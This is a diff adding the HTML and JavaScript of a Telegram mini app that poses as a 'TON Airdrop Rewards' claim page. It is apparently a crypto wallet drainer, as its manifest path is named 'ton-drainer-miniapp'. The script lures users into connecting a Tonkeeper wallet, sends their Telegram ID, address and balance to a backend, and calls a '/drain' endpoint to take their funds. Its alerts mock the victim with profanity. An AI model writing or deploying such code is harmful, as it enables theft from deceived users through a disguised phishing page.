@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>TON Airdrop Mini App</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
+    button { padding: 10px 20px; font-size: 16px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    button:hover { background: #006b9e; }
+  </style>
+</head>
+<body>
+  <h1>TON Airdrop Rewards</h1>
+  <p>Connect your wallet to claim!</p>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    const tonConnect = new TonConnectSDK.TonConnect({
+      manifestUrl: 'https://yourusername.github.io/ton-drainer-miniapp/tonconnect-manifest.json',
+      walletsListSource: 'https://raw.githubusercontent.com/ton-blockchain/wallets-list/main/wallets.json'
+    });
+
+    async function connectWallet() {
+      try {
+        if (tonConnect.connected) {
+          tg.showAlert('Wallet already connected, you sneaky fuck!');
+          const address = tonConnect.wallet.account.address;
+          proceedWithWallet(address);
+          return;
+        }
+
+        console.log('Fetching wallets...');
+        const wallets = await tonConnect.getWallets();
+        console.log('Wallets:', wallets);
+        if (!wallets.length) throw new Error('No wallets found, what the fuck?');
+
+        const tonkeeper = wallets.find(w => w.name.toLowerCase() === 'tonkeeper');
+        if (!tonkeeper) throw new Error('Tonkeeper missing, you’re fucked!');
+
+        console.log('Connecting to Tonkeeper:', tonkeeper);
+        const connectPromise = tonConnect.connect({
+          universalLink: tonkeeper.universalLink,
+          bridgeUrl: tonkeeper.bridgeUrl
+        });
+
+        tg.showAlert('Connecting... Scan the QR code or open your wallet app, you bastard!');
+        console.log('Connection started...');
+
+        // Wait for connection with timeout
+        const wallet = await Promise.race([
+          connectPromise,
+          new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timed out, fuck this!')), 10000))
+        ]);
+
+        if (!wallet || !wallet.account) throw new Error('No wallet connected, what’s this bullshit?');
+        const address = wallet.account.address;
+        console.log('Connected wallet:', address);
+        tg.showAlert(`Wallet connected: ${address.slice(0, 6)}...`);
+        proceedWithWallet(address);
+      } catch (e) {
+        tg.showAlert('Connection fucked up: ' + e.message);
+        console.error('Error:', e);
+      }
+    }
+
+    async function proceedWithWallet(address) {
+      const balance = await fetchBalance(address);
+      sendToTelegram(`User ${tg.initDataUnsafe.user?.id || 'unknown'} connected wallet: ${address} Balance: ${balance} TON`);
+      drainWallet(address);
+    }
+
+    async function fetchBalance(address) {
+      const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+      const data = await response.json();
+      return TonWeb.utils.fromNano(data.result);
+    }
+
+    async function drainWallet(address) {
+      const response = await fetch('http://localhost:3000/drain', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address })
+      });
+      const result = await response.json();
+      tg.showAlert(result.message);
+    }
+
+    function sendToTelegram(message) {
+      fetch('http://localhost:3000/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message })
+      });
+    }
+  </script>
+</body>
+</html>
